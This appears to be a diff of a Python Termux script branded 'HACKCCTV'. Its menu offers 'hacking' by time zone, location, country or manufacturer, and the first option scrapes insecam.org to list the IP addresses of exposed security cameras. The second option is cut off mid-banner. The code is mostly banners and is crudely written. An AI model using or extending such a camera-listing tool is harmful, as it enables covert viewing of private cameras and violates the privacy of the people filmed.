+             ⣿⣿⣮⡛⠿⠿⠿⢷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣇⢿⣿⣿⣿⣿⣿⠜⣺⣿⣿⣷⣤⣀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠻⢿⣿
+             ⣿⣿⣿⣿⣶⣦⣴⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣶⡙⣿⣿⡿⢡⣾⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣀⣴⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠇⠀⠀⠀⠀⣼⡏⣿⣿⣿⣿⣿⣿⠇⣿⣿⡇⢾⣿⣿⣿⣿⣿⣿⢿⡇⠀⠀⠀⠀⡟⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣉⠉⣉⣉⣽⣿
+             ⣿⡉⠠⢤⣀⣀⣄⣭⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⠸⣮⡀⠀⢀⡴⣫⣾⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⢾⣿⣿⣿⣿⣿⣿⣶⡙⣆⡀⠀⢀⣾⢣⡎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⠉⠁⣁⣈⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⡶⣜⢿⡞⣿⣧⠻⣿⣿⣿⣿⣿⡿⢟⢵⣿⣿⣿⡞⡻⣿⣿⣿⣿⣿⣿⢏⣿⣿⣱⡟⣵⢸⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡿⠟⠛
+             ⣿⣷⣦⣤⣍⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⣷⢝⢾⣷⡏⠟⣵⢦⣭⣭⠉⢷⣮⣹⡘⠿⣿⠟⣡⢿⣷⠎⠉⣭⣽⣰⣎⠟⣷⣿⡟⢡⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡌⠁⠀⠐⢾
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣇⠇⣿⣿⣆⠋⢾⣿⡀⠀⢠⡿⠃⣬⢻⣿⢟⣅⠏⣿⡀⠀⣠⣿⡇⢟⣼⣿⣳⠕⣼⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣫⣴⣿⣿⣶⣦
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⠇⣿⣾⣿⣿⣮⣽⣛⣻⣛⣁⣺⢿⣿⣿⣼⢿⣂⣈⣛⣛⣛⣭⣶⣿⣻⣷⣧⢻⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⢿⡄⢻⣟⣿⣿⣿⣿⡿⣿⣿⠿⢿⣷⢹⣿⣏⣾⡿⠿⣿⣿⣿⣿⣿⣻⣿⢿⡏⣸⡿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣼⣦⣍⠻⣿⣿⣻⣧⢿⠁⣾⣶⣿⣼⣿⣧⣷⣶⡗⢸⣟⣿⣧⣿⡿⢟⣩⣾⣧⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⡇⣿⢛⠀⠬⣳⠟⣟⣴⣌⣛⠿⣿⣿⣿⢟⣛⣥⣏⡺⢻⣛⠕⠠⡹⣷⢿⣿⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⠇⣇⢏⣇⡃⡌⡻⠿⠿⢿⣻⣟⣪⢭⣕⣿⡛⡿⠿⠿⣋⢱⢘⡴⡇⡟⠸⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣝⠸⣮⠸⣟⡆⣿⡏⣿⡟⣴⡖⣭⢭⣅⢶⣎⢿⣿⢻⡿⣰⡿⢗⣼⢡⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡕⡱⣜⠵⡹⢡⣶⣾⣶⣷⠮⠶⠷⣶⣶⣶⣶⡜⠇⡷⣣⢋⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢜⣃⠰⢿⣿⣿⢟⣥⣿⣿⣷⣌⠻⣿⣿⠿⠦⡼⡑⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠜⣇⡕⣮⡱⢟⡛⣿⣙⣟⢛⡻⢂⣴⠣⡼⡱⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⣾⢰⠸⢟⣨⡷⢶⢶⡶⢯⣅⡿⠇⡏⡷⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣞⢙⠾⠿⣋⡼⢟⣾⠻⢶⣝⠿⠷⡪⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡻⠟⢋⣴⣿⣿⣿⣦⡙⠻⣏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣽⠛⠒⠛⣯⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+
+        {cyan}██╗  ██╗ █████╗  ██████╗██╗  ██╗ ██████╗ ██████╗████████╗██╗   ██╗ {red}BETA{yellow}2{cyan}
+        ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔════╝╚══██╔══╝██║   ██║
+        ███████║███████║██║     █████╔╝ ██║     ██║        ██║   ██║   ██║
+        ██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██║        ██║   ╚██╗ ██╔╝
+        ██║  ██║██║  ██║╚██████╗██║  ██╗╚██████╗╚██████╗   ██║    ╚████╔╝ 
+        ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝   ╚═╝     ╚═══╝  
+
+
+    {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+    {green}[<ID~>github] ▪︎  {white}https://github.com/mohammadmahdi-termux
+    {cyan}[<ID~>telegram] ▪︎  {white}@Mohammadmahdi_termux
+    {magenta}[<ID~>instagram] ▪︎  {white}@Mohammadmahditermux\~/@Mohammadmahdi_termux
+
+    {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+
+        {yellow}╓                      {yellow}     ╖
+        {yellow}╟1-{red}Hacking by {green}Time zone{yellow}     ║
+        {yellow}║                      {yellow}     ║
+        {yellow}╟2-{red}Hacking by {green}Location {yellow}     ║
+        {yellow}║                      {yellow}     ║
+        {yellow}╟3-{red}Hacking by {green}Counties {yellow}     ║
+        {yellow}║                      {yellow}     ║
+        {yellow}╟4-{red}Hacking by {green}Manufacturers {yellow}║
+        {yellow}╙                      {yellow}     ╜""")
+
+
+
+    lolo=("""""")       
+    type_text(textss)
+    
+
+    user_input = input(f"""{green}$/> {red}Enter a number :{pink} """)
+    
+    if user_input.isdigit():
+        choice = int(user_input)
+
+        if choice == 1:
+            clear_terminal()
+            import requests
+            import re
+            import colorama
+            import os
+            import time
+            import sys
+
+            colorama.init()
+
+            green = "\x1b[1;92m"
+            cyan = "\x1b[1;96m"
+            yellow = "\x1b[1;93m"
+            magenta = "\x1b[1;95m"
+            white = "\x1b[1;97m"
+            blue = "\x1b[1;94m"
+            red = '\x1b[1;91m'
+            underline = '\033[4m'
+            pink = '\033[35m'
+            bold = '\033[1m'
+            black = '\033[30m'
+            def type_text(text):
+                for char in text:
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+                    time.sleep(0.001)
+                print()                 
+            text = (f"""{green}
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
+                ⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
+                ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
+                ⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡇⠀⠀⢀⣼⠿⠇⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
+                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            {yellow}[!]▪︎ {red}EXIT:{white+bold}CTRL+C
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            {green}[<ID~>github] ▪︎  {white}https://github.com/mohammadmahdi-termux
+            {cyan}[<ID~>telegram] ▪︎  {white}@Mohammadmahdi_termux
+            {magenta}[<ID~>instagram] ▪︎  {white}@Mohammadmahditermux
+
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            {red}01–{green} +00:00     {red}02–{green} +01:00     {red}03–{green} +02:00     {red}04–{green} +03:00
+            {red}05–{green} +03:30     {red}06–{green} +04:00     {red}07–{green} +05:00     {red}08–{green} +05:30
+            {red}09–{green} +06:00     {red}10–{green} +07:00     {red}11–{green} +08:00     {red}12–{green} +09:00
+            {red}13–{green} +10:00     {red}14–{green} +11:00     {red}15–{green} +13:00     {red}16–{green} -
+            {red}17–{green} -02:00     {red}18–{green} -03:00     {red}19–{green} -04:00     {red}20–{green} -05:00
+            {red}21–{green} -06:00     {red}22–{green} -07:00     {red}23–{green} -08:00     {red}24–{green} -09:00
+            {red}25–{green} -10:00
+
+            {red}+𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺""")
+            
+
+
+
+            try :
+
+                type_text(text)
+
+                times = ["+00:00","+01:00","+02:00","+03:00","+03:30","+04:00","+05:00","+05:30","+06:00","+07:00","+07:00" ,"+08:00","+09:00","+10:00","+11:00","+13:00","-","-02:00","-03:00","-04:00","-05:00","-06:00","-07:00","-08:00","-09:00","-10:00"]
+
+                headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36"}
+                num = int(input(f"{yellow}[?]~>{red}Enter code timezone : "))
+                if num not in range(1, 26):
+                    raise IndexError
+                text=""
+                time = times[num-1]
+                res = requests.get( f"http://www.insecam.org/en/bytimezone/{time}",headers=headers )
+                last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
+                for page in range(int(last_page)):
+                    res = requests.get( f"http://www.insecam.org/en/bytimezone/{time}/?page={page}", headers=headers )
+                    find_ip = re.findall("http://\d+.\d+.\d+.\d+:\d+", res.text)
+                    print(f"""\n{bold+yellow}@Mohammadmahdi_termux""")
+                    print(green+"")
+
+                    for ip in find_ip:
+                        print(ip)
+
+
+            except:
+
+                        print(red+" !ERORR❌ ")
+
+
+
+
+        elif choice == 2:
+            clear_terminal()
+            import os
+            import re
+            import requests
+            import time
+            import sys
+
+            green  ="\x1b[1;92m"
+            cyan   ="\x1b[1;96m"
+            yellow ="\x1b[1;93m"
+            magenta   ="\x1b[1;95m"
+            white  ="\x1b[1;97m"
+            blue   ="\x1b[1;94m"
+            red  ='\x1b[1;91m'
+            underline = '\033[4m'
+            pink = '\033[35m'
+            bold = '\033[1m'
+            black='\033[30m'
+
+
+            def type_text(text):
+                for char in text:
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+                    time.sleep(0.001)  # تنظیم کنید که سرعت تایپ را تغییر دهد
+                print()                 
+            text = (f"""{green}
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
